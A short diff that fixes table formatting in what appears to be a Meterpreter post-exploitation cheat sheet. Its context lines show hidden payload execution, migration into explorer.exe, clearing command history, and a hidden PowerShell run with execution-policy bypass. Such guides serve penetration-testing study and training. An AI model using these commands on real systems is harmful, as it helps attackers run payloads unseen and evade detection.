@@ -2375,6 +2375,7 @@ meterpreter > execute -f C:\\Windows\\Temp\\second_payload.exe -H
   ```
 
 - **Common AutoRunScripts:**
+
 |Script	|Purpose|
 |----|----|
 |migrate -f	|Migrate to a trusted process (e.g., explorer.exe)|
@@ -2565,7 +2566,9 @@ meterpreter > execute -f C:\\Windows\\Temp\\second_payload.exe -H
 
 
 ## 12. Meterpreter Stealth Tips
+
 |Technique	|Command|
+|----|----|
 |Migrate to trusted process|	migrate 2528 (explorer.exe)|
 |Clear command history	|clear (from Meterpreter)|
 |Run without logs (PowerShell)	|powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File payload.ps1|
